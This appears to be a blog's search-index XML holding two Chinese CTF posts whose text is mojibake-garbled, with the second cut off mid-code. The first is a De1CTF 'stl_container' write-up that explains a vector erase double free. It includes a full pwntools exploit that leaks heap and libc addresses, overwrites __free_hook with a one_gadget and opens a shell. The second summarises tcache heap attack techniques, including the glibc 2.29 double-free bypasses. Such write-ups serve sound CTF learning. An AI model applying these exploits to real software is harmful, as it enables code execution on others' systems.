<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>è¿Ÿæ¥çš„de1ctf stlè§£æ</title>
      <link href="/2020/05/12/%E8%BF%9F%E6%9D%A5%E7%9A%84de1ctf-stl%E8%A7%A3%E6%9E%90/"/>
      <url>/2020/05/12/%E8%BF%9F%E6%9D%A5%E7%9A%84de1ctf-stl%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>å…ˆæ¥äº†è§£ä¸€ç‚¹ï¼Œåœ¨STLå®¹å™¨é‡Œé¢ï¼Œå¦‚æœåœ¨å®¹å™¨é‡Œçš„å†…å®¹æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œé‚£ä¹ˆåœ¨å°†å…¶åˆ é™¤çš„æ—¶å€™ï¼Œå°±ä¼šè°ƒç”¨å…¶è‡ªèº«çš„ææ„å‡½æ•°ï¼Œè€ŒæŒ‡é’ˆçš„ææ„å‡½æ•°åˆä»€ä¹ˆéƒ½ä¸ä¼šåšã€‚é€ æˆçš„ç»“æœå°±æ˜¯æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ä¸ä¼šè¢«é‡Šæ”¾ã€‚</p><p>ä»¥ä¸‹å…¨æ˜¯ä¿ºèƒ¡ä¹±åˆ†æçš„ï¼Œæ²¡çœ‹è¿‡åº•å±‚æºç ï¼Œæ²¡åˆ†æè¿‡å†…å­˜ç®¡ç†(æ¯•ç«Ÿå®çœ‹é¢˜ç›®æºç èƒ½çœ‹å‡ºä¸ªå±)</p><p>ğŸ‘´æ€€ç–‘ï¼Œåœ¨newæ“ä½œï¼Œç„¶åpush_backçš„æ—¶å€™ï¼Œè¿™ç©æ„å„¿è¿›è¡Œäº†ä¸¤æ­¥å®ç°è¿™ä¸ªåŠŸèƒ½ã€‚</p><p>ç¬¬ä¸€æ­¥å°±æ˜¯å…ˆâ›ä¸€ä¸ªå †å—ï¼ŒæŠŠä½ çš„dataä¿å­˜åœ¨é‡Œé¢</p><p>ç¬¬äºŒæ­¥æ‰æ˜¯æ‰€è°“çš„push_backï¼Œä¿ºä»¥ä¸ºçš„å°±æ˜¯æŠŠè¿™ä¸ªcopyè¿‡å»ï¼Œå†deleteäº†ç¬¬ä¸€æ­¥äº§ç”Ÿçš„å †å—</p><p>è¿™ä¹Ÿå°±è§£é‡Šäº†ï¼Œä¸ºä»€ä¹ˆIDAé‡Œé¢è¿›è¡Œnewçš„æ—¶å€™ï¼Œä¼šå‡ºç°è°ƒç”¨ææ„å‡½æ•°çš„æƒ…å†µï¼ˆå¤§æ¦‚ï¼‰</p><p><img src="https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20200512092213646.png" alt></p><p>å¥½äº†ï¼Œä¸Šé¢çš„ä¸å¤§é‡è¦ã€‚ä¿ºä»¬æ¥åˆ†æåˆ†ææ¼æ´å‡ºç°çš„åŸå› ã€‚</p><p>De1çš„æºç é‡Œè°ƒç”¨çš„æ˜¯eraseå‡½æ•°ï¼Œé‚£ä¿ºä»¬å°±æ¥åº·åº·eraseå‡½æ•°çš„æºç </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">iterator <span class="title">erase</span><span class="params">(iterator position)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (position + <span class="number">1</span> != end())</span><br><span class="line">    copy(position + <span class="number">1</span>, finish, position);<span class="comment">//å°†[position+1,finish)å‘å‰ç§»åŠ¨ä¸€ä¸ªå•ä½</span></span><br><span class="line">  --finish;</span><br><span class="line">  destroy(finish);<span class="comment">//ææ„æœ€åä¸€ä¸ªå…ƒç´ </span></span><br><span class="line">  <span class="keyword">return</span> position;<span class="comment">//è¿”å›æ“¦é™¤ä½ç½®çš„è¿­ä»£å™¨</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">iterator <span class="title">erase</span><span class="params">(iterator first, iterator last)</span> </span>&#123;<span class="comment">//æ“¦é™¤ä¸€æ®µå…ƒç´ </span></span><br><span class="line">  iterator i = copy(last, finish, first);<span class="comment">//å°†[last,finish)å‘å‰ç§»åŠ¨last-firstä¸ªå•ä½</span></span><br><span class="line">  destroy(i, finish);<span class="comment">//ææ„iåˆ°finishä¹‹é—´çš„å…ƒç´ ï¼Œä½†æ˜¯è¿˜å¯ä»¥ç”¨</span></span><br><span class="line">  finish = finish - (last - first);<span class="comment">//æ›´æ–°finish</span></span><br><span class="line">  <span class="keyword">return</span> first;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æå‰ï¼Œå…ˆæævectorï¼Œèƒ½å¤Ÿå¯¹vectorå†…çš„ä»»æ„ä½ç½®å…ƒç´ è¿›è¡Œæ’å…¥å’Œåˆ é™¤æ“ä½œã€‚</p><p>vectorçš„åº•å±‚ç®¡ç†æ˜¯è¿™æ ·çš„ï¼Œå…ˆæ˜¯å­˜åœ¨ä¸€å—å†…å­˜ï¼Œé‡Œé¢å­˜å‚¨ç€vectorå½“å‰çš„sizeå¤§å° (beginå’Œendä¸¤å¤„æŒ‡é’ˆ) ä»¥åŠæœ€å¤§çš„sizeå¤§å°ï¼Œä¹Ÿæ˜¯æŒ‡é’ˆã€‚è·Ÿè¿›beginæŒ‡é’ˆï¼Œé‡Œé¢å°±æ˜¯vectorå‚¨å­˜çš„å†…å®¹äº†ã€‚</p><p>è€Œæˆ‘ä»¬è¿™é¢˜ï¼Œvectorçš„å†…å®¹å‚¨å­˜çš„æ˜¯æŒ‡é’ˆï¼Œè¿™å°±å‡ºç°ä¸€ä¸¢ä¸¢é—®é¢˜äº†ã€‚ä¸»è¦è§‚å¯Ÿæºç é‡Œé¢çš„destroy()è¿™å—åœ°æ–¹ï¼Œå®ƒæ˜¯ææ„çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå½“æˆ‘ä»¬è¿›è¡Œfree (0)çš„æ—¶å€™ï¼Œè™½ç„¶vectorä¹Ÿè¿˜æ˜¯ä¼šè¿›è¡Œåˆ é™¤æ“ä½œï¼Œå°†æ•°æ®æ•´ä½“å¾€å‰ç§»ï¼Œå½“ç„¶ï¼Œè¿™é‡Œä¹Ÿæ˜¯æœ¬é¢˜æ¼æ´ç‚¹ä¹‹ä¸€ï¼Œä¸è¿‡å…ˆç•™åˆ°ä¸‹é¢è®²ã€‚æˆ‘ä»¬ä¹Ÿè¯´äº†ï¼Œè™½ç„¶è¿›è¡Œäº†åˆ é™¤æ“ä½œï¼Œä½†æ˜¯å®é™…ä¸Šåº•å±‚å¯¹å…¶è¿›è¡Œçš„ææ„è¿˜æ˜¯å¯¹äºæœ€åä¸€ä¸ªå…ƒç´ çš„ï¼Œä¹Ÿå°±æ˜¯ç¬¬äºŒä¸ªçš„æŒ‡é’ˆï¼Œå¯¹å…¶è¿›è¡Œææ„ã€‚æ‰€ä»¥æ‰ä¼šå‡ºç°free(0)</p><p>çš„æƒ…å†µï¼Œå®é™…ä¸Šè¢«æ”¾å…¥binçš„æ˜¯1ã€‚</p><p>ä¸Šé¢æ˜¯ç¬¬ä¸€ä¸ªåŸå› ï¼Œæ¥ä¸‹æ¥æ˜¯ç¬¬äºŒå¤„ã€‚</p><p>vectorå®¹å™¨å¯¹äºåˆ é™¤æŸä¸€å¤„å†…å­˜åï¼Œä¼šè¿›è¡Œcopyæ“ä½œï¼Œå°†è¯¥å¤„å†…å­˜åˆ°finalçš„å†…å®¹æ•´ä½“å¾€å‰copyã€‚å› ä¸ºæ˜¯æŒ‡é’ˆï¼Œæ‰€ä»¥ç¬¬äºŒä¸ªçš„æŒ‡é’ˆå°±è¢«copyåˆ°ç¬¬ä¸€ä¸ªï¼Œæ­¤æ—¶free(0)ä¹Ÿå°±åˆšå¥½æ˜¯å†æ¬¡å°†å…¶ææ„ã€‚è¿™æ ·å°±æ„æˆäº†æˆ‘ä»¬æ‰€æµ‹è¯•å‡ºçš„double freeçš„ç»“æœã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">'./stl_container'</span>)</span><br><span class="line"><span class="comment">#sh = remote('134.175.239.26',8848)</span></span><br><span class="line">elf = ELF(<span class="string">'stl_container'</span>)</span><br><span class="line">libc = ELF(<span class="string">'libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(container,content)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,str(container))</span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'1'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'data:'</span>,str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(container,index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,str(container))</span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(container,index)</span>:</span></span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,str(container))</span><br><span class="line">    sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">'index'</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">z</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'b'</span>)</span><br><span class="line"><span class="comment">#add</span></span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">z()</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#z()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#show(2,1)</span></span><br><span class="line"><span class="comment">#add(2,'a')</span></span><br><span class="line"><span class="comment">############ leak ######################</span></span><br><span class="line">show(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">heap_base = u64(sh.recvuntil(<span class="string">'\n'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x124B0</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'1'</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line"><span class="comment">#delete 3</span></span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'3'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line"><span class="comment">#delete 4</span></span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'4'</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">'&gt;&gt;'</span>,<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">show(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">libc_base = u64(sh.recvuntil(<span class="string">'\x7F'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x60</span> <span class="number">-0x10</span> - libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">one = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'0'</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="string">'1'</span>)</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">2</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">2</span>,p64(one))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å †æ”»å‡»æ‰‹æ®µæ•´ç†æ€»ç»“</title>
      <link href="/2020/04/15/%E5%A0%86%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E6%95%B4%E7%90%86%E6%80%BB%E7%BB%93/"/>
      <url>/2020/04/15/%E5%A0%86%E6%94%BB%E5%87%BB%E6%89%8B%E6%AE%B5%E6%95%B4%E7%90%86%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>ç®—æ˜¯å¯¹è‡ªå·±æŒæ¡çš„çŸ¥è¯†åšä¸€ä¸ªæ€»ç»“å§ã€‚æ¯•ç«Ÿæ†¨æ†¨ï¼Œç»å¸¸è„‘å­çŠ¯æµ‘ï¼Œè‡ªå·±æŠŠè‡ªå·±ç»•è¿›å»äº†ã€‚å°±è¶ç€æ¸…é†’çš„æ—¶å€™å¯¹äºæ‰‹æ³•ï¼ŒåŸç†è¿›è¡Œä¸€ä¸ªè®°å½•å§ã€‚(æ…¢æ…¢âœå§ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“å¤šä¹…èƒ½å†™å®Œï¼Œæ‡’ç™Œé€‰æ‰‹)</p><h2 id="Tcache-bin"><a href="#Tcache-bin" class="headerlink" title="Tcache_bin"></a>Tcache_bin</h2><p>tcacheåœ¨freeä¸­å¹¶ä¸ä¼šè¢«æ¸…é™¤inuseæ ‡å¿—ï¼Œæ‰€ä»¥ä»–ä»¬è¢«è®¤ä¸ºæ˜¯å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œä¸ä¼šè¢«åˆå¹¶ï¼ŒLIFO</p><h3 id="æŸè¦ç‚¹"><a href="#æŸè¦ç‚¹" class="headerlink" title="æŸè¦ç‚¹"></a>æŸè¦ç‚¹</h3><p>è¿™é‡Œä¹Ÿç‚¹å‡ºä¸€ç‚¹å’Œfastbinçš„mallocæœºåˆ¶æ‰€ä¸åŒçš„åœ°æ–¹</p><p>é¦–å…ˆæ¥çœ‹tcache binçš„mallocæœºåˆ¶</p><p><img src="https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20200424223103869.png" alt></p><p>è®¡ç®—å¯¹åº”çš„sizeæ˜¯å¦åœ¨binä¸­å­˜åœ¨chunkï¼Œtcacheæ˜¯å¦åˆå§‹åŒ–ã€‚mallocä¸å­˜åœ¨å¯¹sizeçš„æ£€æµ‹ã€‚</p><p><code>fastbin</code>çš„mallocæœºåˆ¶ä¸»è¦çœ‹è¿™ä¸€æ®µ</p><p><img src="https://gitee.com/zhzzhz/blog_warehouse/raw/master/img/image-20200424223524506.png" alt></p><p>ä¼šå¯¹mallocçš„chunkçš„sizeä½ä¸fast binä¸­chunkçš„sizeä½è¿›è¡Œæ£€æµ‹ï¼Œæ˜¯å¦åŒ¹é…ã€‚</p><p>ç…§æˆ‘ç†è§£ï¼Œå°±æ˜¯malloc(0x28)çš„æ—¶å€™ï¼Œä¼šå¯¹è¿™ä¸ªmallocé‡Œçš„sizeè¿›è¡Œfastbinä¸­chunkè·å–ï¼Œè·å–å®Œåä¼šè¿›è¡Œè¿™é‡Œçš„ç¬¬ä¸€é‡æ£€æµ‹ï¼Œä¹Ÿå°±æ˜¯å®é™…chunkä¸­çš„sizeä¸fastbinä¸­å–å‡ºçš„chunkçš„sizeè¿›è¡ŒåŒ¹é…ã€‚å› ä¸ºè¿™ä¸€é‡æ£€æµ‹ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰“malloc_hookçš„æ—¶å€™ç»å¸¸ä¼š-0x23è¿™ç§æ“ä½œï¼Œæ¥ä½¿å¾—sizeåŒ¹é…ã€‚</p><h3 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache_dup"></a>tcache_dup</h3><p>å› ä¸ºtcache binæ£€æŸ¥æœºåˆ¶çš„é—®é¢˜ï¼Œå¯ä»¥å‰åä¸¤æ¬¡freeåŒä¸€ä¸ªå †å—ï¼Œæ£€æŸ¥æœºåˆ¶å¹¶ä¸ä¼šæŠ¥é”™ã€‚ä¹Ÿå°±æ˜¯å¸¸è¯´çš„double freeæŠ€å·§ã€‚</p><p>è¿™ç§æ¡ä»¶é€‚ç”¨çš„å‰ææ˜¯å­˜åœ¨ä¸€ä¸ªUAFæ¼æ´ï¼æˆ–è€…ä¹Ÿå¯ä»¥è¿›è¡ŒåŒæŒ‡é’ˆåŒæ—¶æŒ‡å‘åŒä¸€ä¸ªå †å—ï¼</p><p>å› ä¸ºdouble free æ˜¯ä»»æ„åœ°å€å†™çš„ä¸€ç§æŠ€å·§ï¼ŒæŒ‡å †ä¸Šçš„æŸå—å†…å­˜è¢«é‡Šæ”¾åï¼Œå¹¶æ²¡æœ‰å°†æŒ‡å‘è¯¥å †å—çš„æŒ‡é’ˆæ¸…é›¶ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ç¨‹åºçš„å…¶ä»–éƒ¨åˆ†å¯¹è¯¥å†…å­˜è¿›è¡Œå†æ¬¡çš„freeã€‚</p><h3 id="tcache-House-of-Spirit"><a href="#tcache-House-of-Spirit" class="headerlink" title="tcache House of Spirit"></a>tcache House of Spirit</h3><p>è¿™ç§æ‰‹æ³•å’Œfatsbinçš„House of Spiritå¾ˆç±»ä¼¼ã€‚è¿™ç‚¹æˆ‘åœ¨fastbinçš„æ”»å‡»æ‰‹æ®µä¸­è®²è¿°çš„æ¯”è¾ƒè¯¦ç»†äº†ï¼Œè¿™é‡Œå°±ç®€è¦æ¦‚æ‹¬ä¸€ä¸‹ã€‚</p><p>å¯ä»¥è¯´ä¹Ÿæ˜¯ä¸€ç§ä»»æ„åœ°å€å†™çš„æ‰‹æ®µï¼Œä¸è¿‡å¾—å…ˆåœ¨ä½ æƒ³è¦çš„åœ°æ–¹ä¼ªé€ å †å—ï¼Œå¹¶æ§åˆ¶å †æŒ‡é’ˆæŒ‡å‘ä¼ªé€ å †å—çš„memåŸŸï¼Œå°†å…¶é‡Šæ”¾ï¼Œå†æ¬¡mallocä¸€ä¸ªç›¸åŒå¤§å°çš„å †å—å°±å¯ä»¥è¾¾æˆä»»æ„åœ°å€å†™ã€‚</p><p>fastbiné‡Œé¢è¿™ç§æ‰‹æ³•ä½ éœ€è¦å¯¹ä¸‹ä¸€ä¸ªåŒºåŸŸè¿›è¡Œå †å—ä¼ªé€ (ä¸»è¦æ˜¯å†™å…¥æ­£ç¡®çš„sizeä½)ï¼Œè€Œåœ¨tcache binä¸­ï¼Œä½ å°±ä¸éœ€è¦è¿›è¡Œä¸‹ä¸€ä¸ªå †å—çš„ä¼ªé€ ã€‚</p><h3 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h3><p>ä¹Ÿå°±æ˜¯å¸¸è§çš„ä¿®æ”¹tcachebin chunkçš„fdåŸŸï¼Œå®ç°ä»»æ„åœ°å€å†™ã€‚</p><p>è¿™ä¸ªæˆ‘å¯»æ€ï¼Œç»å¸¸å’Œtcache dupé…åˆï¼Œdouble freeåï¼Œè¿›è¡Œfdä¿®æ”¹ï¼Œä¸¤ç§æ”»å‡»ç»„åˆï¼Œå½¢æˆä»»æ„åœ°å€å†™ã€‚</p><h3 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h3><p>æ¯ä¸ªçº¿ç¨‹é€šè¿‡ä¸€ä¸ªtcache_perthread_structçº¿ç¨‹æœ¬åœ°å˜é‡ä¿å­˜tcache binä»¥åŠç›¸å…³çš„chunkè®¡æ•°ã€‚å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹tcache_perthread_structè¿™ä¸ªç»“æ„ä½“çš„å†…å®¹ï¼Œå°±å¯ä»¥å®Œå…¨æ§åˆ¶mallocçš„å†…å­˜åˆ†é…ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•è·å¾—è¿™ä¸ªåœ°å€ï¼Œå¹¶æ§åˆ¶ä»–å‘¢ï¼Ÿæˆ‘ä»¬æ¥äº†è§£ä¸‹tcacheçš„åˆå§‹åŒ–è¿‡ç¨‹ï¼ŒMAYBE_INIT_TCACHEè¿™ä¸ªå®ï¼Œä»–åœ¨æ²¡æœ‰åˆå§‹åŒ–tcacheçš„æƒ…å†µä¸‹ä¼šåˆå§‹åŒ–ä¸€ä¸ªtcacheï¼Œå®é™…ä¸Šåˆå§‹åŒ–tcacheçš„å·¥ä½œæ˜¯ç”±å†…éƒ¨å‡½æ•°tcache_initå®Œæˆçš„<br>###tcache_init<br>static void<br>tcache_init(void)<br>{<br>mstate ar_ptr;<br>void *victim = 0;<br>const size_t bytes = sizeof (tcache_perthread_struct);<br>ä¹Ÿå°±æ˜¯è¯´ï¼Œtcache_perthread_structåº”è¯¥ä¿å­˜åœ¨å †åŒºçš„åº•éƒ¨ï¼Œå› ä¸ºä»–æ˜¯æœ€å…ˆåˆ†é…çš„å†…å­˜ç©ºé—´ã€‚å®ƒçš„ç»“æ„ä½“ä¸­ä¿å­˜ç€0x20-0x90binä¸­chunkçš„æ•°é‡å’Œä¿¡æ¯ã€‚å¦‚æœæˆ‘ä»¬å°†tcache_perthread_structä¸­binçš„ä¿¡æ¯å…¨éƒ¨æ”¹ä¸º0707070707070707ä¹Ÿå°±ä»£è¡¨äº†tcache binå…¨éƒ¨è¢«æˆ‘ä»¬å¡«æ»¡ï¼Œæ¥ä¸‹æ¥çš„chunkå°±ä¼šfreeè¿›fast or unsortedé‡Œé¢ã€‚</p><h3 id="glibc-2-29é‡Œçš„tcache-bin"><a href="#glibc-2-29é‡Œçš„tcache-bin" class="headerlink" title="glibc 2.29é‡Œçš„tcache bin"></a>glibc 2.29é‡Œçš„tcache bin</h3><p>ç®€å•æ¥è¯´ï¼Œæ–°å¢äº†ä¸€ä¸ªæŒ‡é’ˆkeyæ”¾åœ¨bkä½ç½®ï¼Œå½“chunkè¢«freeæ”¾å…¥tcacheæ—¶ï¼Œkeyä¼šè¢«å†™å…¥<code>tcache_perthread_struct</code>çš„åœ°å€ã€‚chunkè¢«å–å‡ºæ—¶ï¼Œkeyä¼šè¢«æ¸…ç©ºã€‚</p><p>åœ¨freeæ—¶ï¼Œå­˜åœ¨ä¸€é‡æ£€æµ‹ï¼Œä¼šæ£€æµ‹keyæ˜¯å¦ä¸º<code>tcache_perthread_struct</code>çš„åœ°å€ï¼Œç„¶åéå†tcacheï¼Œæ£€æµ‹è¯¥chunkæ˜¯å¦å·²ç»åœ¨tcacheé‡Œã€‚</p><p>ä¹Ÿå°±æ˜¯:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e-key == &amp;tcache_perthread_struct &amp;&amp; chunk in tcachebin[chunk_idx]</span><br></pre></td></tr></table></figure><p>ç”±æ­¤äº§ç”Ÿçš„æ€è·¯:(æŠ„æŸçˆ·çˆ·çš„ï¼Œåœ°å€åœ¨è¿™:<a href="https://www.secshi.com/39809.html" target="_blank" rel="noopener">https://www.secshi.com/39809.html</a>)</p><ol><li>å¦‚æœæœ‰UAFæ¼æ´æˆ–å †æº¢å‡ºï¼Œå¯ä»¥ä¿®æ”¹<code>e-&gt;key</code>ä¸ºç©ºï¼Œæˆ–è€…å…¶ä»–é<code>tcache_perthread_struct</code>çš„åœ°å€ã€‚è¿™æ ·å¯ä»¥ç›´æ¥ç»•è¿‡<code>_int_free</code>é‡Œé¢ç¬¬ä¸€ä¸ªifåˆ¤æ–­ã€‚ä¸è¿‡å¦‚æœUAFæˆ–å †æº¢å‡ºèƒ½ç›´æ¥ä¿®æ”¹chunkçš„fdçš„è¯ï¼Œæ ¹æœ¬å°±ä¸éœ€è¦ç”¨åˆ°double freeäº†ã€‚</li><li>åˆ©ç”¨å †æº¢å‡ºï¼Œä¿®æ”¹chunkçš„sizeï¼Œæœ€å·®çš„æƒ…å†µè‡³å°‘è¦åšåˆ°off by nullã€‚ç•™æ„åˆ°<code>_int_free</code>é‡Œé¢åˆ¤æ–­å½“å‰chunkæ˜¯å¦å·²å­˜åœ¨tcacheçš„åœ°æ–¹ï¼Œå®ƒæ˜¯æ ¹æ®chunkçš„å¤§å°å»æŸ¥æŒ‡å®šçš„tcacheé“¾ï¼Œç”±äºæˆ‘ä»¬ä¿®æ”¹äº†chunkçš„sizeï¼ŒæŸ¥æ‰¾tcacheé“¾æ—¶å¹¶ä¸ä¼šæ‰¾åˆ°è¯¥chunkï¼Œæ»¡è¶³freeçš„æ¡ä»¶ã€‚è™½ç„¶double freeçš„chunkä¸åœ¨åŒä¸€ä¸ªtcacheé“¾ä¸­ï¼Œä¸è¿‡ä¸å½±å“æˆ‘ä»¬ä½¿ç”¨tcache poisoningè¿›è¡Œæ”»å‡»ã€‚</li></ol><h3 id="å…³äºtcacheä¸‹å¯¹äºmain-arenaæ³„éœ²çš„ä¸€äº›ä¸ªäººè§è§£"><a href="#å…³äºtcacheä¸‹å¯¹äºmain-arenaæ³„éœ²çš„ä¸€äº›ä¸ªäººè§è§£" class="headerlink" title="å…³äºtcacheä¸‹å¯¹äºmain_arenaæ³„éœ²çš„ä¸€äº›ä¸ªäººè§è§£"></a>å…³äºtcacheä¸‹å¯¹äºmain_arenaæ³„éœ²çš„ä¸€äº›ä¸ªäººè§è§£</h3><p>æ‰‹æ³•ä¸€:</p><h4 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span 